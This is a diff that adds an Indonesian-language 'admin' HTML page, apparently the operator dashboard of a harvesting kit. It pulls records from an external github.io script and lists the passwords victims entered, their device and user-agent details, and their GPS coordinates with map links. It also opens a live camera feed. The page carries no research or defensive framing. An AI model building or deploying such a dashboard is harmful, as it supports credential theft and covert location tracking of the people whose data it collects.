@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Admin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f4f4f4;
+        }
+        h2 {
+            text-align: center;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            background: white;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+        .video-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        video {
+            width: 50%;
+            border: 2px solid #000;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Data Login & Akses Kamera</h2>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>Waktu</th>
+                <th>Password Dimasukkan</th>
+                <th>Perangkat</th>
+                <th>Lokasi</th>
+            </tr>
+        </thead>
+        <tbody id="login-data">
+            <tr>
+                <td colspan="4" style="text-align:center;">Memuat data...</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>Live Kamera</h2>
+    <div class="video-container">
+        <video id="adminVideo" autoplay></video>
+    </div>
+
+    <script src="https://kkykrnwn.github.io/script-bucin/js/script.js"></script>
+    <script>
+        function loadLoginData() {
+            let data = getLoginData();
+            let tableBody = document.getElementById("login-data");
+            tableBody.innerHTML = "";
+
+            if (data.length === 0) {
+                tableBody.innerHTML = `<tr><td colspan="4" style="text-align:center;">Belum ada data login</td></tr>`;
+                return;
+            }
+
+            data.forEach(entry => {
+                let row = document.createElement("tr");
+
+                let timeCell = document.createElement("td");
+                timeCell.textContent = entry.timestamp;
+                
+                let passwordCell = document.createElement("td");
+                passwordCell.textContent = entry.password;
+
+                let deviceCell = document.createElement("td");
+                deviceCell.textContent = `${entry.device.platform} | ${entry.device.userAgent}`;
+
+                let locationCell = document.createElement("td");
+                if (entry.location) {
+                    locationCell.innerHTML = `<a href="https://www.google.com/maps?q=${entry.location.latitude},${entry.location.longitude}" target="_blank">
+                        ${entry.location.latitude}, ${entry.location.longitude}
+                    </a>`;
+                } else {
+                    locationCell.textContent = "Tidak tersedia";
+                }
+
+                row.appendChild(timeCell);
+                row.appendChild(passwordCell);
+                row.appendChild(deviceCell);
+                row.appendChild(locationCell);
+
+                tableBody.appendChild(row);
+            });
+        }
+
+        function startAdminCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById("adminVideo").srcObject = stream;
+                })
+                .catch(error => {
+                    console.error("Gagal memuat kamera di admin:", error);
+                });
+        }
+
+        // Load data login saat halaman admin dibuka
+        loadLoginData();
+        startAdminCamera();
+    </script>
+
+</body>
+</html>
